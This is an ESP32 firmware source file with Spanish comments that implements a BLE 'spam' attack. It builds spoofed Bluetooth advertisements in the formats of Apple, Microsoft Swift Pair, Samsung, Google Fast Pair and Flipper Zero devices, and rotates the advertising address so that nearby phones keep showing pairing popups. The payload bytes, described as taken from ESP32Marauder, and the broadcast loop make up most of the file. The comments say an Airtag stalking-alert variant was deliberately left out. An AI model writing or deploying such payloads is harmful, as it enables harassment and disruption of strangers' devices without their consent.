#include "Apps/screen_btspam.h"
#include "Drivers/buzzer.h"
#include "Drivers/settings.h"
#include <WiFi.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <esp_random.h>

static const unsigned char image_Layer_9_bits[] PROGMEM = {
  0x7e,0x7e,0x7e,0x7e,0x99,0x99,0x99,0x99,
  0x67,0xe6,0x67,0xe6,0x18,0x18,0x18,0x18,
  0x67,0xe6,0x67,0xe6,0x99,0x99,0x99,0x99,
  0x7e,0x7e,0x7e,0x7e
};

// ---------------------------------------------------------------------
//  BT Spam v2 -- basado en la tecnica real de ESP32Marauder
//  (justcallmekoko/ESP32Marauder, WiFiScan.cpp::GetUniversalAdvertisementData
//  y ::executeBLESpam), no en un formato inventado.
//
//  Mas fabricantes ademas de Apple: Microsoft (Swift Pair), Samsung
//  (Galaxy Buds), Google (Fast Pair) y Flipper Zero, con los bytes tal
//  cual los arma Marauder (Company ID + estructura de cada fabricante),
//  no inventados. Rota de fabricante cada ROTATE_INTERVAL_MS.
//
//  Direccion BLE: Marauder randomiza la MAC en CADA paquete via
//  esp_base_mac_addr_set() + un ciclo deinit/init. Eso se probo aca y
//  crashea en hardware real (ESP32-C6, arduino-esp32 3.3.11) con
//  "Guru Meditation Error / Store access fault" -- no es un problema
//  de frecuencia ni de timing: crashea incluso llamando
//  esp_base_mac_addr_set() una sola vez, antes del PRIMER init() de
//  toda la sesion (se ve tambien como "ble_store_config_write_local_irk
//  rc=27" / "ble_store_util_status_rr rc=17" en el log serial justo
//  antes del panic). O sea: esp_base_mac_addr_set() en si mismo es
//  incompatible con el almacenamiento de bonding/identidad de este
//  puerto de NimBLE en este chip+core -- porque cambia la identidad
//  DEL CHIP completo, de la que depende ese almacenamiento.
//
//  La solucion real: BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM) +
//  BLEDevice::setOwnAddr(addr) en cada rotacion. Esto usa la API del
//  HOST de NimBLE (ble_hs_id_set_rnd) para cambiar solo la direccion
//  CON LA QUE SE ANUNCIA, sin tocar la identidad del chip ni el
//  almacenamiento de bonding/IRK -- por eso no deberia repetir el
//  crash. Si igual llega a crashear con esto, avisame y volvemos a
//  sacar la randomizacion (como en la version anterior de este
//  archivo, que solo usaba la MAC de fabrica fija).
//
//  OJO -- que quede claro que NO se porto todo Marauder: el tipo
//  "Airtag" del codigo original (que hace que el celular de alguien
//  muestre la alerta de seguridad "Es posible que te esten siguiendo")
//  se dejo AFUERA a proposito. Eso ya no es una simple travesura de
//  popup de emparejamiento, es abusar de una funcion de seguridad
//  anti-stalking real -- si te interesa igual esa parte, pedimelo
//  aparte y lo hablamos.
//
//  Los bytes de cada fabricante se tomaron del repo publico de
//  Marauder pero solo se probo en hardware real el flujo de
//  init/rotacion/stop de este archivo -- si algun tipo puntual no
//  dispara popup, avisame para revisar ese payload especifico.
// ---------------------------------------------------------------------

enum SpamType { SPAM_APPLE, SPAM_MICROSOFT, SPAM_SAMSUNG, SPAM_GOOGLE, SPAM_FLIPPER, SPAM_TYPE_COUNT };
static const char* TYPE_NAMES[SPAM_TYPE_COUNT] = {
  "Apple", "Microsoft", "Samsung", "Google Fast Pair", "Flipper Zero"
};

// Google Fast Pair y Flipper Zero causaron "Stack smashing protect
// failure!" en hardware real. El codigo de sus payloads
// (addGooglePacket/addFlipperPacket) sigue intacto abajo, pero por
// defecto quedan apagados -- ver btSpamIsTypeUnstable().
//
// Que fabricantes rotan es configurable desde Ajustes -> BT Spam (una
// pantalla de checkbox) o desde la terminal de Ajustes (comando
// "btspam"), no un arreglo fijo en el codigo. El estado se guarda en
// NVS como una mascara de bits (settingsGetBtSpamMask/SetBtSpamMask,
// un bit por indice de SpamType) y se relee cada vez que se arranca
// el spam, en rebuildActiveList().
static SpamType activeList[SPAM_TYPE_COUNT];
static int       activeCount = 0;

static void rebuildActiveList() {
  uint8_t mask = settingsGetBtSpamMask();
  activeCount = 0;
  for (int i = 0; i < SPAM_TYPE_COUNT; i++) {
    if (mask & (1 << i)) {
      activeList[activeCount++] = (SpamType)i;
    }
  }
  if (activeCount == 0) {
    // Si en Ajustes se desmarcaron todos, no dejar la rotacion vacia
    // (division por cero mas abajo) -- usar Apple como respaldo.
    activeList[0] = SPAM_APPLE;
    activeCount   = 1;
  }
}

int btSpamGetTypeCount() { return SPAM_TYPE_COUNT; }

const char* btSpamGetTypeName(int i) {
  if (i < 0 || i >= SPAM_TYPE_COUNT) return "";
  return TYPE_NAMES[i];
}

bool btSpamIsTypeUnstable(int i) {
  return i == SPAM_GOOGLE || i == SPAM_FLIPPER;
}

bool btSpamIsTypeEnabled(int i) {
  if (i < 0 || i >= SPAM_TYPE_COUNT) return false;
  uint8_t mask = settingsGetBtSpamMask();
  return (mask & (1 << i)) != 0;
}

void btSpamSetTypeEnabled(int i, bool enabled) {
  if (i < 0 || i >= SPAM_TYPE_COUNT) return;
  uint8_t mask = settingsGetBtSpamMask();
  if (enabled) mask |= (1 << i);
  else         mask &= ~(uint8_t)(1 << i);
  settingsSetBtSpamMask(mask);
}

static const unsigned long ROTATE_INTERVAL_MS = 1000; // Marauder throttlea "Sour Apple" a 1s

static BLEAdvertising* pAdvertising = nullptr;
static bool           spamming     = false;
static int            currentType  = 0;
static int            activeIndex  = 0;
static unsigned long  lastRotate   = 0;
static uint32_t       packetsSent  = 0;

static uint8_t rnd8() { return (uint8_t)(esp_random() & 0xFF); }

// Direccion BLE "static random" -- NO es lo mismo que randomizar la
// MAC del chip con esp_base_mac_addr_set() (eso crasheaba, ver nota
// arriba de todo el archivo). Esto usa BLEDevice::setOwnAddr(), que
// llama a ble_hs_id_set_rnd() adentro de NimBLE: solo cambia la
// direccion que se usa PARA anunciar, a nivel del host BLE, sin tocar
// la identidad del chip ni el almacenamiento de bonding/IRK -- por
// eso no deberia repetir el crash. Los dos bits mas significativos del
// primer byte tienen que ser "11" para que sea una direccion random
// "static" valida segun el spec de Bluetooth (evitar el error de
// generateRandomMac() de la version anterior, que usaba la convencion
// de Ethernet "localmente administrada" en vez de la de BLE).
static void generateRandomAddr(uint8_t addr[6]) {
  for (int i = 0; i < 6; i++) addr[i] = rnd8();
  addr[0] |= 0xC0; // top 2 bits = 11 -> static random address valida
}

static void randomName(char* out, uint8_t len) {
  static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
  for (uint8_t i = 0; i < len; i++) out[i] = charset[rnd8() % (sizeof(charset) - 1)];
  out[len] = '\0';
}

// ---------- Payloads (bytes tal cual Marauder, GetUniversalAdvertisementData) ----------

// NOTA sobre "static" en los arreglos de abajo -- no es por reentrancia
// (estas funciones se llaman una sola vez por rotacion, nunca en
// paralelo), es para que los buffers vivan en .bss en vez de la pila.
// Cada rotacion ya viene de una cadena de llamadas bastante profunda
// (loop -> screenBtSpamLoop -> applyPacket -> addXPacket -> NimBLE
// host), y el task de loop() en el ESP32-C6 no tiene un stack enorme;
// sacar estos arreglos de la pila reduce el uso de stack en el punto
// mas profundo de esa cadena. Ademas cada addData() ahora manda el
// conteo real de bytes escritos (variable i/total), nunca sizeof(raw),
// para que el tamano fisico del arreglo nunca pueda desincronizarse
// del payload realmente armado.
static void addApplePacket(BLEAdvertisementData &adv) {
  if (rnd8() % 10 != 0) {
    // "Accion" (Handoff/AirDrop) -- popup mas chico y rapido
    static uint8_t raw[11];
    int i = 0;
    raw[i++] = 0x0A; raw[i++] = 0xFF; raw[i++] = 0x4C; raw[i++] = 0x00;
    raw[i++] = 0x0F; raw[i++] = 0x05; raw[i++] = 0xC0;
    static const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2f, 0x01, 0x06, 0x20};
    raw[i++] = types[rnd8() % (sizeof(types))];
    raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8();
    adv.addData((char*)raw, i);
  } else {
    // "Dispositivo" (AirPods/Watch/etc) -- el cartel grande de "Conectar"
    static uint8_t raw[21];
    int i = 0;
    raw[i++] = 0x14; raw[i++] = 0xFF; raw[i++] = 0x4C; raw[i++] = 0x00;
    raw[i++] = 0x07; raw[i++] = 0x0F; raw[i++] = 0x00;
    static const uint16_t models[] = {
      0x0220, 0x0F20, 0x1320, 0x1420, 0x0E20, 0x0A20, 0x0055, 0x0C20,
      0x1120, 0x0520, 0x1020, 0x0920, 0x1720, 0x1220, 0x1620
    };
    uint16_t model = models[rnd8() % (sizeof(models) / sizeof(models[0]))];
    raw[i++] = (uint8_t)(model >> 8);
    raw[i++] = (uint8_t)(model & 0xFF);
    raw[i++] = 0xAC; raw[i++] = 0x90; raw[i++] = 0x85; raw[i++] = 0x75; raw[i++] = 0x94; raw[i++] = 0x65;
    raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8(); raw[i++] = rnd8();
    raw[i++] = 0x00;
    adv.addData((char*)raw, i);
  }
}

static void addMicrosoftPacket(BLEAdvertisementData &adv) {
  static char name[6];
  randomName(name, 5);
  uint8_t total = 7 + 5;
  static uint8_t raw[12];
  int i = 0;
  raw[i++] = total - 1;
  raw[i++] = 0xFF; raw[i++] = 0x06; raw[i++] = 0x00; raw[i++] = 0x03; raw[i++] = 0x00; raw[i++] = 0x80;
  memcpy(&raw[i], name, 5);
  i += 5;
  adv.addData((char*)raw, total);
}

static void addSamsungPacket(BLEAdvertisementData &adv) {
  static uint8_t raw[15];
  int i = 0;
  raw[i++] = 14; raw[i++] = 0xFF; raw[i++] = 0x75; raw[i++] = 0x00;
  raw[i++] = 0x01; raw[i++] = 0x00; raw[i++] = 0x02; raw[i++] = 0x00; raw[i++] = 0x01;
  raw[i++] = 0x01; raw[i++] = 0xFF; raw[i++] = 0x00; raw[i++] = 0x00; raw[i++] = 0x43;
  raw[i++] = rnd8(); // "modelo/color" -- Marauder usa una tabla real de watch models, aca va random
  adv.addData((char*)raw, i);
}

static void addGooglePacket(BLEAdvertisementData &adv) {
  static uint8_t raw[14];
  int i = 0;
  raw[i++] = 3; raw[i++] = 0x03; raw[i++] = 0x2C; raw[i++] = 0xFE;
  raw[i++] = 6; raw[i++] = 0x16; raw[i++] = 0x2C; raw[i++] = 0xFE;
  raw[i++] = 0x00; raw[i++] = 0xB7; raw[i++] = 0x27;
  raw[i++] = 2; raw[i++] = 0x0A;
  raw[i++] = (uint8_t)((rnd8() % 120) - 100); // -100 a +19 dBm, TX power falso
  adv.addData((char*)raw, i);
}

static void addFlipperPacket(BLEAdvertisementData &adv) {
  static char name[6];
  randomName(name, 5);
  // OJO: son 27 bytes en total (5 campos fijos de cabecera + 5 del
  // nombre + 17 mas de payload), NO 24 -- con raw[24] esto escribia
  // 3 bytes pasado el final del arreglo y tronaba con
  // "Stack smashing protect failure!" en hardware real apenas la
  // rotacion llegaba a Flipper (ultimo tipo del ciclo).
  static uint8_t raw[27];
  int i = 0;
  raw[i++] = 0x02; raw[i++] = 0x01; raw[i++] = 0x06;
  raw[i++] = 0x06; raw[i++] = 0x09;
  memcpy(&raw[i], name, 5);
  i += 5;
  raw[i++] = 0x03; raw[i++] = 0x02; raw[i++] = (uint8_t)(0x80 + (rnd8() % 3) + 1); raw[i++] = 0x30;
  raw[i++] = 0x02; raw[i++] = 0x0A; raw[i++] = 0x00;
  raw[i++] = 0x05; raw[i++] = 0xFF; raw[i++] = 0xBA; raw[i++] = 0x0F;
  raw[i++] = 0x4C; raw[i++] = 0x75; raw[i++] = 0x67; raw[i++] = 0x26; raw[i++] = 0xE1; raw[i++] = 0x80;
  adv.addData((char*)raw, i);
}

// ---------- Emitir un paquete (sin tocar el stack BLE) ----------

// La rotacion entre fabricantes solo cambia los datos del advertising
// (stop + setAdvertisementData + start), sin volver a inicializar el
// stack BLE -- eso es seguro hacer en caliente. Ahora SI se randomiza
// la direccion en cada llamada (ver generateRandomAddr arriba), via
// BLEDevice::setOwnAddr() -- eso es lo que hace que el celular vea
// "un dispositivo nuevo" en cada rotacion y vuelva a mostrar el popup,
// en vez de cachear siempre la misma direccion y dejar de avisar.
static void applyPacket(int type) {
  // Esperar a que el advertising anterior haya terminado del todo antes
  // de cambiar de direccion. pAdvertising->stop() (llamado por quien
  // invoca applyPacket en cada rotacion) puede devolver exito antes de
  // que el controlador confirme el stop, y NimBLE rechaza
  // ble_hs_id_set_rnd() (adentro de setOwnAddr) con EBUSY si todavia ve
  // advertising activo -- eso es lo que daba "setOwnAddr fallo" en casi
  // todas las rotaciones despues de la primera. Timeout corto (50ms)
  // para no trabarse si algo raro pasa.
  unsigned long waitStart = millis();
  while (pAdvertising->isAdvertising() && millis() - waitStart < 50) {
    delay(1);
  }

  uint8_t addr[6];
  generateRandomAddr(addr);
  if (!BLEDevice::setOwnAddr(addr)) {
    Serial.println(F("BT Spam: setOwnAddr fallo, se sigue con la direccion anterior"));
  }

  BLEAdvertisementData advData;
  switch (type) {
    case SPAM_APPLE:     addApplePacket(advData);     break;
    case SPAM_MICROSOFT: addMicrosoftPacket(advData); break;
    case SPAM_SAMSUNG:   addSamsungPacket(advData);   break;
    case SPAM_GOOGLE:    addGooglePacket(advData);    break;
    case SPAM_FLIPPER:   addFlipperPacket(advData);   break;
  }
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  packetsSent++;
}

static void startSpam() {
  if (spamming) return;

  // El radio 2.4GHz es compartido entre WiFi y BLE en este chip: si
  // quedo algo de WiFi encendido de otra pantalla, se apaga aqui para
  // no pelear con el controlador de BLE.
  WiFi.mode(WIFI_OFF);

  BLEDevice::init("");
  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->setScanResponse(false);

  // BLE_OWN_ADDR_RANDOM: le dice al host que use la direccion random
  // que le pasemos con setOwnAddr(), no la MAC publica del chip. Esto
  // no toca esp_base_mac_addr_set ni la identidad del chip -- por eso
  // no deberia repetir el "Guru Meditation / Store access fault" que
  // dio esp_base_mac_addr_set (ver nota arriba de todo el archivo).
  if (!BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM)) {
    Serial.println(F("BT Spam: setOwnAddrType fallo, se sigue con la MAC publica"));
  }

  rebuildActiveList();
  activeIndex = 0;
  currentType = activeList[activeIndex];
  applyPacket(currentType);

  spamming    = true;
  lastRotate  = millis();
  packetsSent = 0;
  Serial.println(F("BT Spam: iniciado"));
}

static void stopSpam() {
  if (!spamming) return;

  if (pAdvertising) pAdvertising->stop();
  // deinit(false) -- NO libera la memoria del controlador BT. Con
  // deinit(true) el siguiente init() crasheaba (ver nota arriba);
  // sacrifica poder cambiar de modo BT/BLE, pero es estable para
  // simplemente prender/apagar el advertising varias veces.
  BLEDevice::deinit(false);

  spamming = false;
  Serial.println(F("BT Spam: detenido"));
}

// ---------- Botones ----------

static bool isButtonJustPressed(int pin) {
  static uint8_t lastStableState[4] = {HIGH, HIGH, HIGH, HIGH};
  static uint8_t lastReading[4]     = {HIGH, HIGH, HIGH, HIGH};
  static unsigned long lastDebounceTime[4] = {0, 0, 0, 0};

  const int pins[4] = {PIN_SELECT, PIN_UP, PIN_DOWN, PIN_BACK};
  int index = -1;

  for (int i = 0; i < 4; i++) {
    if (pins[i] == pin) { index = i; break; }
  }
  if (index == -1) return false;

  uint8_t reading = digitalRead(pin);

  if (reading != lastReading[index]) {
    lastDebounceTime[index] = millis();
    lastReading[index] = reading;
  }

  if ((millis() - lastDebounceTime[index]) > 50) {
    if (lastStableState[index] == HIGH && reading == LOW) {
      lastStableState[index] = reading;
      return true;
    }
    lastStableState[index] = reading;
  }
  return false;
}

// ---------- Pantalla ----------

void screenBtSpamLoop() {
  // Rota de fabricante cada ROTATE_INTERVAL_MS. Ya NO reinicia el stack
  // BLE (ver nota en applyPacket/startSpam) -- solo cambia los datos
  // del advertising, que es seguro hacer en caliente.
  if (spamming && millis() - lastRotate >= ROTATE_INTERVAL_MS) {
    lastRotate = millis();
    pAdvertising->stop();
    activeIndex = (activeIndex + 1) % activeCount;
    currentType = activeList[activeIndex];
    applyPacket(currentType);
  }

  if (isButtonJustPressed(PIN_BACK)) {
    buzzerClick();
    if (spamming) stopSpam();
    currentScreen = SCREEN_APPS;
    return;
  }

  if (isButtonJustPressed(PIN_SELECT)) {
    buzzerBeep();
    if (spamming) stopSpam();
    else          startSpam();
  }

  u8g2.clearBuffer();
  u8g2.setFontMode(1);
  u8g2.setBitmapMode(1);
  u8g2.setFont(u8g2_font_6x10_tr);

  u8g2.setDrawColor(1);
  u8g2.drawBox(16, 1, 96, 14);
  u8g2.setDrawColor(2);
  u8g2.drawStr(43, 11, "BT Spam");
  u8g2.setDrawColor(1);

  u8g2.drawXBM(0, 1, 16, 14, image_Layer_9_bits);
  u8g2.drawXBM(112, 1, 16, 14, image_Layer_9_bits);

  char line[24];

  if (spamming) {
    u8g2.drawDisc(10, 21, 3);
    u8g2.drawStr(16, 25, "ON");
  } else {
    u8g2.drawCircle(10, 21, 3);
    u8g2.drawStr(16, 25, "OFF");
  }
  snprintf(line, sizeof(line), "%lu pkts", (unsigned long)packetsSent);
  u8g2.drawStr(80, 25, line);

  u8g2.setFont(u8g2_font_5x7_tr);
  if (spamming) {
    u8g2.drawStr(6, 40, TYPE_NAMES[currentType]);
  } else {
    u8g2.drawStr(6, 39, "Listo para anunciar");
  }

  u8g2.drawStr(6, 62, "BACK: Salir");
  u8g2.drawStr(6, 52, "SEL: Iniciar");

  u8g2.sendBuffer();
}
